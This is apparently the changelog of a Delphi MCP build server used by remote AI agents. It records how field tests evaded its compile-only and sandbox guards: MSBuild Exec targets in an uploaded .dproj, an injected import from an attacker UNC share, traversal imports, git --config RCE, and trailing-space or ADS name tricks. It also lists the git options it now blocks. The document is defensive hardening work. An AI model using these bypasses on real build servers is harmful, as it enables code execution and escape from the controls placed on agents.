8 E2E batteries, **416 checks** (new: R9 concurrency burst over HTTP; scanner
false-positive / opt-in cases).

## [0.27.0-beta] - 2026-08-20

Field round 9 (Fable), first findings - plus the vault bootstrap redesigned to
match how the same vault is read locally.

### Security
- **CRITICAL: the vault's governance files could be written through a trailing
  space.** `vault_append` with `"MEMORY.md "` reached the real file: Windows
  trims the space when opening, while the governance check compared the raw
  string and saw a different name. The check now decides on the **resolved**
  path, and the Windows name rule (segment ending in a dot or space, or
  carrying an ADS) is enforced by **one shared helper** - the same one the
  workspace jail uses, now covering every path segment rather than only the
  last. The same trick had defeated `delphi_textedit` in an earlier round; it
  is now a single rule in a single place instead of one per toolset.
- **`vault_patch` could empty a note** (`old_text` = the whole content,
  `new_text` = `""`). Deleting knowledge is not an operation this server
  offers, so a replacement that would leave the note blank is refused - the
  automatic backup is there for accidents, not as a licence.

### Changed
- **The vault bootstrap serves WHOLE FILES again.** Concatenating rules + index
  into one 85 KB result overflowed a client, and paging it by line meant
  reading documentation in fragments - which is not how the vault is read
  locally. Now each file arrives complete, and when the two do not fit
  together the second is fetched by name (`vault_read {path: "MEMORY.md"}`):
  the split happens between files, never inside one. Measured on a real vault:
  22 KB then 63 KB, two calls, both whole.

### Fixed
- Removed a duplicated implementation of the Low-integrity labelling helper in
  `Lsp.Sandbox` (the same function body under two names).

7 E2E batteries, **401 checks**.

## [0.26.2-beta] - 2026-08-20

### Changed
- **All build output now lands under `Compiled/`** (`Compiled/<Platform>/<Config>`
  for binaries, `Compiled/Dcu/...` for units) instead of scattering
  `Win32/`/`Win64/` folders through the source tree - the layout `delphi_config
  set-output` produces, now applied to this project itself. `Compiled/` added to
  `.gitignore` (binaries and `settings.ini` were already ignored by name).

### Fixed
- **`DELPHI_MCP_VAULT_READONLY` only overrode the ini when set to `0`.** Setting
  it to `1` fell through to `settings.ini`, so a writable vault could not be
  forced back to read-only from the environment. The variable now wins in both
  directions.
- The test batteries defaulted to the **Debug** executable, which sits next to
  the operator's production `settings.ini` and so inherited its jail and vault.
  They now default to the **Release** build, which carries no configuration -
  the convention that was already in use, now the default so the batteries run
  with no arguments.

7 E2E batteries, **390 checks**.

## [0.26.1-beta] - 2026-08-20

### Security
- **The knowledge vault now belongs to the `vault_*` tools alone, wherever it
  sits.** Putting a vault *inside* a workspace root used to expose it to the
  code tools: `delphi_edit` could rewrite a note behind the vault's back -
  skipping the automatic backup and the protection of the governance files -
  and `delphi_list` served the notes as if they were source. Any path inside
  the vault is now refused by the code tools with a message pointing at
  `vault_read`/`vault_append`, and the vault is skipped in the `delphi_list`,
  `delphi_search` and `delphi_projects` walks. The isolation no longer depends
  on where the operator happens to put the folder.

7 E2E batteries, **390 checks**.

## [0.26.0-beta] - 2026-08-20

Field round 8 (Fable): the vault passed its security review untouched, but the
round broke the compile-only guard again and found the bootstrap unusable.

### Security
- **CRITICAL: the build guard was evadable through a macro-based `<Import>`.**
  0.25.1 trusted any import written with an MSBuild macro, but
  `$(MSBuildProjectDirectory)\payload.targets` is *both* macro-based and
  resolves right next to the project - so uploading a `.targets` there and
  importing it ran its `<Exec>` at build time. Confirmed end to end.
  Imports are now **followed and scanned recursively** (depth-capped): only the
  IDE's own targets are trusted without being read, anything else must resolve
  to a readable file that passes the same scan, and what cannot be resolved is
  refused. `<Target>`/`<Exec>` are also matched with an XML namespace prefix
  (`<msb:Target>` slipped past a literal match; MSBuild happened to reject it,
  which is not a guarantee to rely on). A traversal now disqualifies an import
  outright - `$(BDS)\..\..\evil.targets` was macro-based and ended in
  `.targets`, and the previous whitelist trusted it.

### Fixed
- **The vault bootstrap did not fit in one answer.** `vault_read` with no path
  returned rules + index whole - 85 KB against a real vault, past a client's
  per-result cap, forcing it to spill to disk and read the result back in
  pieces. Reads are now **paged by line** with a per-result budget, and every
  truncated answer states the exact continuation offset
  (`Mostradas las lineas 1..271 de 379. Pide el resto con {offset: 272}`).
  Verified against the real vault: 40 KB first page, continuation works.
- **A rejected path came back rewritten.** Asking for `C:/Windows/win.ini` was
  refused with `"srvc:/Windows/win.ini"` - the outbound drive filter rewriting
  an echo of the caller's own text, confusing to debug. The rejection no longer
  echoes the path; it states the rule.

7 E2E batteries, **383 checks**.

## [0.25.1-beta] - 2026-08-20

### Security
- **Hardened the compile-only scan against evasions** (found while writing the
  next field-test brief, before it shipped). The 0.24.0 guard matched element
  names case-sensitively and let an `<Import>` name any relative file, so three
  routes remained: odd casing (`<prebuildevent>`), and — the real one — a
  *clean-looking* `.dproj` importing an evil `.targets` dropped beside it, which
  moved the payload one file away from the scan. The whole scan is now
  case-insensitive, and an `<Import>` is refused unless it is macro-based
  (`$(BDS)\...`, as every real project's imports are): no UNC, no absolute, no
  `..`, no bare relative file. Verified: 7 evasion variants refused, and an
  untouched project still builds.

## [0.25.0-beta] - 2026-08-19

### Added
- **Knowledge vault: persistent memory for agents (optional, off by default).**
  Point `[Vault] Path` at a folder of Markdown notes (an Obsidian vault) and the
  server exposes it, so an agent working remotely can consult accumulated
  knowledge — decisions, conventions, project context — and not just source
  code. Nothing registers unless configured.
  - `vault_read` — a note by relative path, with line numbers and
    `offset`/`limit`. **With no path it returns the vault's own rules
    (`AGENTS-VAULT.md`) plus its index (`MEMORY.md`)**: the bootstrap, because
    those filenames are a vault convention a remote agent should not have to
    know. Lazy loading is the protocol — the vault is never read in bulk.
  - `vault_search` — `target=files` (glob over note names) or `target=content`
    (regex inside notes → path, line number, line), optionally scoped to a
    `subfolder`.
  - **Writing (opt-in, `[Vault] ReadOnly=0`, read-write credential only):**
    `vault_append` (a dated log entry or progress line, optionally after a
    unique `anchor`), `vault_create` (new note, **never** overwrites) and
    `vault_patch` (replace a fragment that appears exactly once). There is
    deliberately no wholesale rewrite, no delete, no move and no git.
  - **The rules that can be enforced by code are enforced by the server:** the
    original of any modified note is copied to `backups/mcp/<timestamp>/` first
    (no parameter disables it); the governance files (`AGENTS-VAULT.md`,
    `AGENTS-VAULT-WRITE.md`, `MEMORY.md`) are never writable; a strict jail
    (relative paths only, no `..`, `.md` only, `backups/`/`.git/`/`.obsidian/`
    excluded); UTF-8 in and UTF-8 without BOM out; and notes over 100 000
    characters are truncated with a pointer to `offset`/`limit`.
  - The *doctrine* stays in the vault itself, not in the code — so two people
    can point this at two different vaults and each gets their own rules.
    See **docs/VAULT.md**, which also shows how to start a vault from scratch.

  - **Session wiring, so no agent has to be taught any of this:** when a vault
    is configured the MCP `initialize` response carries `instructions` (there
    is a vault, start with `vault_read` and no path — short on purpose, since
    instructions ride in every prompt), and a `vault` prompt is exposed, which
    clients surface as an invocable command (`/vault` in Claude Code) to reload
    rules + index mid-session. A vault can replace that text with its own by
    placing `VAULT-INSTRUCTIONS.md` at its root — its "skill".
  - **First run seeds itself:** point `[Vault] Path` at a folder that does not
    exist or holds no notes and the server creates a working starter vault
    there (rules, index, write guide, example project). A vault that already
    has notes is never touched. The same starter kit ships in
    `examples/vault/` — generic on purpose: the shape, not anyone's content.
  - The vault is an **independent jail**: it lives outside the workspace roots,
    the code tools cannot read it and the vault tools cannot serve code.
  - Vault text is exempt from drive-letter masking, like `delphi_read`: an
    agent copies fragments of a note verbatim to build the `anchor`/`old_text`
    of a later write, so the text must match the file on disk byte for byte.

7 E2E batteries, **371 checks** (the vault battery adds 83).

## [0.24.0-beta] - 2026-08-19

Field round 7 (Fable): the sandbox held again, but the round found the real
hole — the "compile-only, never execute" posture had a build-time escape.

### Security
- **CRITICAL: code execution via `delphi_upload` + `delphi_build`.** `delphi_upload`
  writes any path with no extension filter, so a `.dproj` could be planted whose
  MSBuild `<Target><Exec>` ran an arbitrary shell command on the next
  `delphi_build` — at normal integrity, defeating "this server only compiles".
  The narrow, documented pre/post-build vector turned out to be trivial to reach.
  Fixed at the point of execution: before running MSBuild, the project is scanned
  and a build that would **execute a shell** — a custom `<Target>`/`<Exec>`, a
  non-empty Pre/PostBuild/Link event, or an `<Import>` of a foreign (UNC or
  absolute non-macro) targets file — is **refused**, unless the operator opted
  into execution with `[Security] AllowRun=1` (the same switch that gates
  `delphi_run`). The scan holds however the `.dproj` arrived (upload, edit, or
  pre-existing). A stock RAD Studio project has none of these and builds normally.
- **HIGH: `delphi_upload` overwrote with no undo.** A fresh upload (offset 0)
  truncates the target; it was the only writer that could destroy a file with no
  backup (a 1-byte upload wiped a real `.dproj` in testing). Upload now copies
  the existing file to the recoverable trash (`__delphi-patch`) before truncating.

6 E2E batteries, **280 checks** (adds the upload+build exploit, now blocked, and
the upload backup).

## [0.23.0-beta] - 2026-08-19

Field round 6 (Fable): the filesystem sandbox held against every attack; the
three findings left are behaviour/UX papercuts, none a security hole.

### Fixed
- **R6-A: `delphi_config view` reported the wrong enabled/disabled per platform.**
  The `.dproj` platform list was parsed with a separate attribute list (`value`)
  and value list (inner text); the file's `<Platform Condition="…">Win64</Platform>`
  selector — inner text but no `value` — shifted the value list by one, so every
  platform's `enabled` flag was mislabelled. Each `<Platform value="X">V</Platform>`
  is now parsed as a unit, so name and enabled always come from the same element.
- **R6-C: a low-integrity `delphi_run` could not overwrite a pre-existing file**
  in its own working folder (a log/csv/ini created earlier at Medium integrity)
  — an unexplained "Acceso denegado". The inherited Low label only reached new
  children; existing entries are now relabelled too, so the confined run can
  update its own outputs and nothing else. (Only reachable with `AllowRun=1`.)

### Added
- **R6-B: `delphi_list includeTrash=true`** surfaces the recoverable trash
  (`__delphi-patch`, where `delphi_delete` moves files) so a deleted file can be
  found and restored with `delphi_move`. Hidden by default, as before.

6 E2E batteries, **276 checks**.

## [0.22.0-beta] - 2026-08-19

### Added
- **`delphi_config set-output`: put every binary under one folder.** A curated
  edit of the `.dproj` (same pipeline as `add-platform`: shared `Lsp.Dproj`
  read, encoding-preserving write, automatic `__delphi-patch` backup) that sets
  `DCC_ExeOutput` to `.\<folder>\$(Platform)\$(Config)` and `DCC_DcuOutput` to
  `.\<folder>\Dcu\$(Platform)\$(Config)` — the common RAD Studio convention,
  keeping the per-platform/config subfolders so Win32 and Win64 never collide.
  Default folder `Compiled`; `output=default` restores the stock layout. The
  folder name is validated (simple relative token only — no XML metacharacters,
  no absolute path, no `..`), so it cannot inject into the project the way the
  0.19.0 platform name could. A write op: refused for read-only credentials.
  Verified end-to-end: after `set-output Compiled`, a real build lands its
  `.exe` in `Compiled\Win64\Debug\`. 6 batteries, **271 checks**.

## [0.21.0-beta] - 2026-08-19

This release settles the server's posture: it is a **pure development/compile
server**. It compiles; it does not execute. Testing a binary belongs on the
client's own machine (or a real target device), not on the build box.

### Changed
- **`delphi_run` is now OFF by default.** Executing a compiled program on the
  build server is both pointless (nobody sees the process there) and the main
  way a runaway agent could do damage, so it is refused for **every**
  credential — read-write tokens included — enforced in the single entry gate.
  The rejection points the agent at the intended path instead: download the
  artifact (`delphi_package` + `delphi_fetch`) and run it on your machine, or
  deploy to a real target (PAServer on Linux/macOS, or Android) where it runs
  on the client, not the server. An operator who genuinely needs server-side
  execution (e.g. a console test runner in CI) can opt in with `[Security]
  AllowRun=1` (env `DELPHI_MCP_ALLOW_RUN=1`); the low-integrity sandbox and Job
  Object still apply in that case.

### Added
- **Startup log now announces the workspace jail (roots).** The single most
  important operational fact — what the agents can and cannot touch on disk —
  was absent from the banner. It now prints `Workspace jail (roots, N): …`, or
  a warning when there is no jail (unrestricted) or the roots are invalid
  (fail-closed). Same summary in the console and tray hosts.
- **`docs/AGENT.md`** — a model-facing guide (prefer semantic tools over text
  search, virtual paths, 0-based positions, safe editing, recoverable trash)
  to paste into an agent's `CLAUDE.md` / `AGENTS.md`.

6 E2E batteries, **264 checks** (adds a check that `delphi_run` is refused by
default). See below for the 0.20.0 sandbox this builds on.

## [0.20.0-beta] - 2026-08-19

### Security
- **Real filesystem sandbox for `delphi_run` (closes the B0b write vector).**
  A program launched by `delphi_run` now runs at **Low integrity** (Windows
  Mandatory Integrity Control), so it **cannot write** to any object at the
  normal (Medium) integrity level — the user profile, other projects,
  `C:\Windows`, anywhere on the system. Its own working directory is labelled
  Low so it can still write its output there, and there only. Reads are
  unaffected (read-down is allowed) and stdout is still captured. The response
  states `sandbox=low-integrity`; if the OS ever refuses the confined launch
  it says `sandbox=NO` instead of pretending. Verified: a compiled program
  that tries to write to `C:\Users\Public` is blocked while its local write
  succeeds. This plus the 0.17.0 Job Object (lifetime/resources) sandboxes
  run along both axes.
  *Scope: `delphi_run` only. `delphi_build` still runs the trusted toolchain
  at normal integrity (it must write .dcu/.exe and read the SDK/registry); a
  malicious `.dproj` pre/post-build step remains a narrower, documented
  vector.*

## [0.19.0-beta] - 2026-08-19

Field round 5 (Fable): one critical injection and two recovery gaps.

### Security
- **R5-B (critical): XML injection through `delphi_config add-platform`.** The
  platform name was interpolated raw into `<Platform value="…">` in the
  `.dproj`, with no validation or escaping. A crafted name closed the tag and
  injected a live `<Import Project="\\attacker\share\x.targets"/>` — which
  MSBuild would execute on the next `delphi_build` (build-time RCE). The name
  is now validated against the canonical platform whitelist (Win32, Win64,
  Win64x, WinARM64EC, OSX64, OSXARM64, Linux64, Android(64), iOS…); anything
  else is refused, so no metacharacter can reach the file. It really is a
  curated edit now.

### Added
- **`delphi_config remove-platform`**: the reversible inverse of
  add-platform (disables a platform), backing the `.dproj` up first — the
  symmetry that was missing for recovery.

### Fixed
- **R5-A: the trash was unrecoverable by the route its own message named.**
  `delphi_delete` said "recover with `delphi_move` from that path", but
  `delphi_move` refused any path under the trash. Restoring an item OUT of the
  trash is now allowed (moving the trash folder itself, or moving items INTO
  it by hand, stays refused), and the delete message spells out the exact
  call.
- **R5-C: `.dproj` edits now leave a backup.** `add-platform`/`remove-platform`
  write through the same backup-first path as `delphi_edit`, so a bad edit is
  recoverable from `__delphi-patch\`.

## [0.18.0-beta] - 2026-08-19

Four issues from an external code review, all fixed and regression-tested.

### Security
- **No-credential server binds to localhost only.** With NO token and no
  `AnonymousReadOnly`, the HTTP host would listen on every interface — an
  unconfigured server silently open to the network. It now binds `127.0.0.1`
  only in that case; remote access requires a token (or an explicit
  `AnonymousReadOnly=1`).
- **More git options refused at the gate.** `--config` is `-c`'s long form on
  `clone` and slipped through (`git clone --config core.sshCommand=… ` →
  RCE); also `--separate-git-dir`, `--template`, `--git-dir` and `--work-tree`
  redirect where git writes/reads and could escape the jail. All now refused
  alongside the existing `-c`/`--output`/`--no-index` set.

### Fixed
- **Build/run no longer hangs on a silent process.** The output pipe was
  drained with a blocking `ReadFile`, so a child that produced no output
  blocked forever and the timeout never fired. It now polls with
  `PeekNamedPipe`, honouring the deadline even on a silent hang (verified: a
  mute 60 s process with a 3 s timeout returns in ~3 s).
- **The tray app now registers all 27 tools.** Five units added in 0.15–0.16
  (`delphi_config`, `delphi_paserver`, `delphi_delete`, `delphi_move`,
  `delphi_report`) were linked into the console host but not the tray, so the
  tray silently exposed fewer tools. Both host unit-lists are now kept in
  sync (with a comment on each to keep it that way).

### Docs
- README no longer claims a Windows Service, LRU eviction or idle-shutdown as
  shipped — they are marked roadmap. What runs today (console + tray, warm
  DelphiLSP per workspace) is described as it is.

## [0.17.0-beta] - 2026-08-19

### Security
- **Build/run processes are confined in a Windows Job Object** (B0b): the
  whole spawned tree (cmd → msbuild → dcc, or a launched exe) is now
  **killed on job close**, so a timeout or the server shutting down never
  leaves orphaned compiler/child processes behind; a process-count cap guards
  against fork bombs and a per-process memory cap against runaways; UI
  restrictions block the tree from exiting Windows or changing system
  settings. Applied at the single process-launch point, so it covers build,
  run and git. **Honest scope**: this bounds process lifetime and resources,
  not filesystem access — a compiled program can still write where the
  service account can. Full per-directory confinement (AppContainer / a
  restricted token) remains future work; the workspace jail plus this Job
  Object bound the damage.

## [0.16.0-beta] - 2026-08-19

### Added
- **`delphi_delete` (tool 26)**: remove a file or folder inside the workspace
  — NOT a hard delete: the target is moved to a recoverable trash
  (`__delphi-patch\<date>\deleted\` next to it), so a mistake can be undone.
  Refuses to delete the trash folder itself. Jailed, read-write only. Cleans
  up stray files and build leftovers.
- **`delphi_move` (tool 27)**: move or rename a file/folder inside the
  workspace; the source is copied to the trash first, destination parents are
  created, an existing destination is never overwritten. Jailed, read-write.
- **`[Server] BindIP`** (env `DELPHI_MCP_BIND_IP`): bind the HTTP listener to
  one interface (e.g. a LAN/VPN address) instead of all interfaces — which
  also removes the duplicate IPv4+IPv6 firewall prompt.

## [0.15.0-beta] - 2026-08-19

Cross-platform groundwork: see and manage a project's build configurations,
and discover the Platform Assistant so an agent can target Linux/macOS.

### Added
- **`delphi_config` (tool 24)**: see and manage a project's build
  configurations and target platforms. `view` (read-only) reports the
  framework, the configurations (Debug/Release/custom) and every platform
  with whether it is enabled, whether the project **can** target it, and
  whether it needs a remote profile. `add-platform` (read-write) enables a
  platform in the `.dproj` — a **curated** edit of the `<Platforms>` block
  only. It refuses a platform the framework cannot target: **VCL is Windows
  only** (`Vcl.Forms` does not exist on Linux/macOS/mobile); FMX and console
  cross platforms.
- **`delphi_paserver` (tool 25, read-only)**: the bridge for building on
  other platforms via the Platform Assistant. `platforms` lists what this
  server can target and each platform's profile/SDK status; `packages` lists
  the PAServer installers that ship with each Delphi install (download with
  `delphi_fetch`, run on the Linux/Mac target); `profiles` lists the
  registered connection profiles and SDKs. The write/network half (create a
  profile against the target, deploy+run remotely) builds on this once a live
  PAServer target exists.
- **`Lsp.Dproj`**: the single tolerant `.dproj` parser, now shared by the LSP
  config fabricator and these tools — no second parser (house rule).
- `delphi_build` accepts any declared platform, not just Win32/Win64.

## [0.14.0-beta] - 2026-08-19

The library read zone finally covers what it always promised, plus the
fourth field round's findings.

### Fixed
- **The read zone was missing most of the machine's Delphi material**, a gap
  in a feature shipped back in 0.6.0:
  - it walked only `Win32`/`Win64`, while an install registers a Library
    Search Path for **every** platform (13 here: Linux64, OSX64, OSXARM64,
    Android ×2, iOS ×4, Win64x, WinARM64EC…);
  - it expanded a hardcoded handful of macros, so every entry using
    `$(BDSCatalogRepository…)` was silently dropped — i.e. **every GetIt
    package** (FmxLinux, LockBox…) and the Android SDKs.
  Macros are now expanded against the IDE's own authoritative table
  (`HKCU\…\BDS\<ver>\Environment Variables`), all registered platforms are
  walked, the catalog repositories are included whole (the search path points
  at compiled `Lib\`, while the useful material is the sibling `source\`),
  and it is done **per installation** — each Delphi owns its packages.
- **`delphi_list` aborted entirely on one unreadable subdirectory**
  (`TDirectory.GetFiles` recursive is all-or-nothing) and again when asking
  size/date of a file whose path exceeds the classic length limit. Measured
  on the Android NDK, which killed a whole listing; it now walks tolerantly
  and lists 19,436 files there.
- **R4-A**: `delphi_fetch` returned the server's real path. The byte-fidelity
  exemption was wrong for it: its payload is base64, an alphabet with neither
  `:` nor `%`, so masking cannot corrupt it. Only `delphi_read` stays exempt
  (its payload is file text an edit anchor must match).
- **R4-C**: `delphi_list` echoed `..\` segments back in every returned path;
  the root is canonicalized first.
- Paths whose last segment is `.` or `..` are no longer refused as
  "name ending in a dot": they are ordinary navigation, and the jail already
  canonicalizes before deciding (escape attempts through `..` remain caught —
  verified in the field round).

### Added
- **R4-B**: `delphi_workspace` publishes `readableExtra` — the read-only
  library zone (installations, library paths, catalog repositories), so the
  agent knows what it may read besides the roots instead of being told
  "anything outside is refused".

## [0.13.0-beta] - 2026-08-19

Read-only becomes airtight, a feedback channel for the agents that use the
server, and the third field round's findings.

### Added
- **`delphi_report` (tool 23)**: agents report bugs, limitations or
  suggestions **directly to the server**, which stores each one as its own
  timestamped markdown file (version, date, kind, origin, message) in a
  `reports/` folder next to the executable — a history that can be read and
  worked through later. Deliberately **available at every access level,
  read-only included**: the restricted agents are the ones most likely to hit
  a wall. Safe by construction — the client never supplies a path: the folder
  is fixed and the file name is generated server-side.
- **`Lsp.Texts`**: every model-facing text (tool/parameter descriptions,
  rejections, notices) and the version string now live in ONE unit. These
  texts are the server's real user interface; scattered they drift and
  contradict each other. Pure ASCII by convention — the encoding rule that
  produced the mojibake bug is now a property of the file.

### Security
- **Read-only is now airtight** (found by an internal audit that ran the
  server anonymously and tried to escape):
  - `delphi_git diff|show --output=<path>` let ANY client — including
    anonymous/read-only — write files anywhere on disk, **outside the
    workspace roots included** (an absolute `--output` ignores `-C <repo>`).
    Dangerous git options (`--output`, `--no-index`, `--exec`,
    `--upload-pack`, `--receive-pack`, `--ext-diff`, `--textconv`,
    `--config-env`, `-c`, `-o`) are now refused **at the single gate**, so the
    rule applies to every git call at BOTH access levels.
  - `delphi_git tag` with a `message` (annotated tag = a write) passed the
    read-only gate when `args` was empty: the gate only looked at `args`.
- Verified in the same audit and left unchanged (they were already correct):
  401 for a missing token when one is configured, and the per-request
  read-only flag being re-set on every request (no leakage between pooled
  Indy threads).

### Fixed
- **C1-bis**: `insert:"metodo"` with `visibility:"published"` placed the
  declaration right after the class header — i.e. BEFORE the component
  fields, which is E2169 ("field definition not allowed after methods").
  It now lands after the last member of the implicit published section.
- **B5** (root cause found by measuring the live JSON): `definition` answers a
  bare Location **object**, not an array, so the chaining added in 0.12.0
  never triggered and `kind=declaration` still returned the enclosing scope.
  The parser now accepts object/array/LocationLink and aims the second lookup
  at the routine's identifier column.
- **R3-1**: LSP tools leaked the real drive in their URIs
  (`file:///D%3A/...`) because the percent-encoded colon dodged the mask.
  Virtual drive units now cover that form too.
- `delphi_git log` regression test no longer asserts on a specific old commit
  message (it scrolled out of the 20-line window).

## [0.12.0-beta] - 2026-08-19

Virtual drive units — server paths stop looking like the client's own disks —
plus every finding from the second field round (the "Agenda" end-to-end run:
2 projects, 7 commits, 16/16 tests, ~86 MCP calls).

### Added
- **Virtual drive units (`srvd:`, `srvc:`, ...)**: the server's real drive
  letters never travel to the client. One generic prefix rule at the single
  dispatch gate handles both directions — arguments are expanded on the way
  in (`srvd:\x` → `D:\x`; real paths still accepted), and every textual
  result is masked on the way out, INCLUDING compiler/git/LSP output and 8.3
  short forms (`D:\PROYEC~1`). Byte-fidelity exemption: successful
  `delphi_read`/`delphi_fetch` content travels verbatim (an edit anchor
  built from masked text would not match the disk); their rejections are
  masked like everything else. Measured origin: remote agents mistaking
  server paths for their own local disks.
- **`delphi_edit delete:true`**: removes the anchored line ENTIRELY
  (`new:""` only blanks it — and now says so: `BLANQUEADA la linea N ...
  para eliminarla del todo usa delete:true`).
- **IDE settings read at runtime** (`IdeConfigValue`, generic HKCU reader —
  the building block for future Android/macOS/SDK configuration): new
  units/forms/projects are created with the encoding the IDE is configured
  to use (`Editor\DefaultFileFilter`: UTF-8 → utf8-bom, ANSI → cp1252), and
  BOM-less pure-ASCII files get their first accents written in that same
  standard.

### Fixed
- **B3 (blocker): `insert:"rutina-global"` in a `.dpr`** placed the routine
  before `end.` — legal in a unit, E2070 + 2×E2029 in a program. In a `.dpr`
  the routine now lands between the `uses` clause and the main `begin`;
  `insert:"metodo"` on a `.dpr` is refused with guidance.
- **C1: `insert:"metodo"` with `visibility:"published"`** now works on form
  classes with no explicit section keyword: the declaration lands in the
  implicit published section right after the class header — the event
  handler case, the most common VCL edit.
- **B1: `delphi_git commit`/`tag` messages** now reach git via `-F <file>`
  (byte-exact): embedding them in the command line turned every `"` into
  `''`.
- **B5: `delphi_definition kind=declaration` on a call site** returned the
  declaration of the ENCLOSING method; the tool now chains
  definition→declaration at the target's own position, so it answers the
  callee.
- **B2: `acentos=` counted the UTF-8 BOM** as 3 phantom high bytes.
- **B4: mojibake in `delphi_create form-vcl` response messages**: a handful
  of message literals carried non-ASCII bytes that the compiler mangles when
  the IDE's default encoding disagrees with the file; all server messages
  are now pure ASCII by construction.
- Scaffolded `.gitignore` no longer carries a UTF-8 BOM (git does not strip
  it, which silently broke the first ignore rule).

### Security
- **`[Workspace] Roots` parsing fails CLOSED**: quotes around a root are
  tolerated and stripped (paths with spaces need no quoting — the separator
  is `;`), and if Roots is configured but NO root parses valid, every path
  is refused instead of silently running unrestricted.

## [0.11.0-beta] - 2026-08-19

The transfer batch, plus the addendum findings from the replication run.
Bringing a repository in no longer means recreating it file by file.

### Added
- **`delphi_git clone` / `pull` / `fetch`**: a whole repository onto the
  server in ONE call, jailed to the workspace roots (URL in `message`,
  destination in `repo`; only http/https/git/ssh URLs; refuses to clone
  over an existing repo). Measured: the full public repo cloned in 1.2 s
  versus ~200 MCP calls to recreate it.
- **`delphi_upload` (tool 22)**: the mirror of `delphi_fetch` — chunked
  base64 upload with whole-file SHA-256 verification, for material that
  cannot be recreated by editing (`.res`, icons, binary designer files).
  Jailed, creates parent directories, refuses out-of-order offsets.
- **Create-with-content**: `delphi_edit createunit` accepts `content` (the
  whole unit in one call instead of create + N anchored patches — the
  measured friction #1: 6 calls per file down to 1), both it and
  `delphi_textedit` accept `eol` (`crlf` default / `lf`), because the JSON
  channel usually delivers LF-only text.

### Security
- **Windows name-normalization bypass closed** (found in the field): a path
  ending in a dot or space ("X.pas.") passes any literal extension check
  while Windows creates "X.pas" — it defeated the `.pas` guard of
  `delphi_textedit`. Alternate Data Streams ("X.pas::$DATA") did the same.
  Both are now refused at the single write gate, so the fix covers EVERY
  writing tool, not just the one where it was found.
- `delphi_upload` validates the base64 alphabet itself: Delphi's decoder
  skips invalid characters instead of failing, which would have written a
  silently corrupt file.

### Fixed
- `delphi_textedit` create reported `encoding=utf8` for pure-ASCII content
  that a later `delphi_read` detects as cp1252; it now says what detection
  will say.

## [0.10.0-beta] - 2026-08-19

More field-test findings from the full-repo replication run. Two were real
bugs (one an outright blocker), one a new tool, one a security hardening.

### Fixed
- **Dotted unit names** (blocker): `delphi_edit createunit` and scaffolded
  form units rejected names like `Lsp.BuildRunner` — the tool could not
  create the very units of the project it is part of. Namespaced names
  (`Ident(.Ident)*`) are now accepted.
- **Access Violation on `delphi_edit` with `new=""`**: blanking a line
  crashed the handler (indexing an empty split). Empty replacement now
  blanks the line cleanly.

### Added
- **`delphi_workspace` (tool 21)**: the server's lay of the land — the
  configured workspace roots (made explicit so a remote agent never
  confuses SERVER paths with its own local disk), the access level
  (read-write / read-only) and the active Delphi. Read-only; call it first.

### Security
- Every `delphi_run` (arbitrary execution by design) and `delphi_build`
  (can run pre/post-build steps from the .dproj) now writes an audit line
  to the log — for run, the executed binary's SHA-256. (Build and run
  remain refused under a read-only credential.) OS-level sandboxing of the
  spawned process is tracked as future work.

## [0.9.1-beta] - 2026-08-19

### Fixed
- **Mojibake in delphi_git output** (second field-test round): git emits
  UTF-8 but captured console output was decoded as ANSI ("AÃ±ade" for
  "Añade"). The capture now runs a strict UTF-8 scan over the bytes:
  well-formed UTF-8 with high bytes decodes as UTF-8, everything else keeps
  the ANSI fallback (compilers and console programs emit ANSI/OEM). Applies
  to delphi_git, delphi_run and delphi_build alike. 142 checks.

## [0.9.0-beta] - 2026-08-19

Everything in this release comes from the first real remote field test: a
Claude Desktop agent on another machine drove the full cycle over HTTP and
its report exposed four issues. All four are fixed and test-locked.

### Fixed
- **Stale LSP buffer** (the big one): the language server saw each file as
  it was when first opened; edits made afterwards (delphi_edit, scaffolding,
  external editors) were invisible to completion/signature/definition. Now
  every acquire compares a disk fingerprint (mtime+size) and refreshes the
  buffer via didChange - the LSP always answers about the CURRENT source.
- **BOM false positive in the delphi_edit audit**: on UTF-8+BOM files the
  high-byte accounting smuggled 3 phantom bytes (the BOM) into the "leaving"
  side, producing "ACENTOS FUERA DE CUADRO: esperaba 0 y hay 3" on perfectly
  healthy writes (and scaring agents into restoring). Text fragments are now
  encoded BOM-less for accounting.

### Changed
- **delphi_git `message`**: normal punctuation is welcome (the message never
  goes through a shell - git is spawned with a direct command line); only
  line breaks are refused. Shell-metacharacter screening stays on `args`.
- **delphi_git `config`** added to the whitelist, restricted to `user.name`
  / `user.email` (value in `message`), so a remote agent can commit on a
  fresh repo/machine. Refused in read-only mode like every write.
- **delphi_create** ships a basic `.gitignore` with every new project
  (build artifacts, tool backups, `.delphilsp.json`); the agent may edit it
  later with delphi_textedit.

### Tests
- 141 checks across the 5 batteries (stale-buffer refresh, BOM accounting
  on utf8-bom, git config identity + free punctuation, scaffold .gitignore).

## [0.8.0-beta] - 2026-08-19

Closes the gap found by the full capability inventory of DelphiLSP 37.0
(docs/DELPHILSP-NOTES.md): the engine announced signatureHelp and
declaration/implementation providers that no tool exposed.

### Added
- **`delphi_signature` (tool 20)**: signature help for the call under a
  position — routine signatures with parameter names/types, the IDE's
  Ctrl+Shift+Space. Position must be inside the call parentheses.
- **`delphi_definition` `kind` parameter**: `definition` (default) = the
  body in the implementation section; `declaration` = the interface
  declaration — the two halves of a Delphi unit. (`implementation` is
  accepted but the engine answers it like declaration — measured.)

### Docs
- DELPHILSP-NOTES: measured navigation semantics (definition=body,
  declaration=interface, implementation≡declaration), LSIF conditions and
  kill-switch, `$Y` requirement, DelphiLSPLog registry logging.

## [0.7.0-beta] - 2026-08-19

### Added
- **`delphi_installs` (tool 19)**: list every RAD Studio/Delphi installation
  discovered on the machine (side-by-side versions are common), with root
  directory, DelphiLSP/msbuild availability, and which one is ACTIVE for the
  LSP engine (the newest shipping DelphiLSP.exe). Installs without DelphiLSP
  are listed too: they still build via msbuild.

### Fixed
- **No composed branding paths**: `$(BDSUSERDIR)`/`$(BDSCOMMONDIR)` are now
  resolved from the authoritative `rsvars.bat` written by the installer
  (Embarcadero renames its Documents folder between eras — e.g. "RAD
  Studio" vs "Embarcadero\Studio"), never composed by hand. Entries that
  cannot be resolved are dropped instead of guessed.

## [0.6.0-beta] - 2026-08-19

Born from a dogfooding audit: "could this MCP have built its own project?"
The Delphi cycle could; docs, tests and release engineering could not. Now
they can.

### Added
- **`delphi_textedit` (tool 18)**: safe editing of plain-text NON-Delphi
  files (.md .html .js .css .sql .py .bat .ini .json ... any plain text,
  denylist not whitelist) with the same discipline as `delphi_edit` —
  one-full-line unique anchor with hints and atline tie-break, encoding and
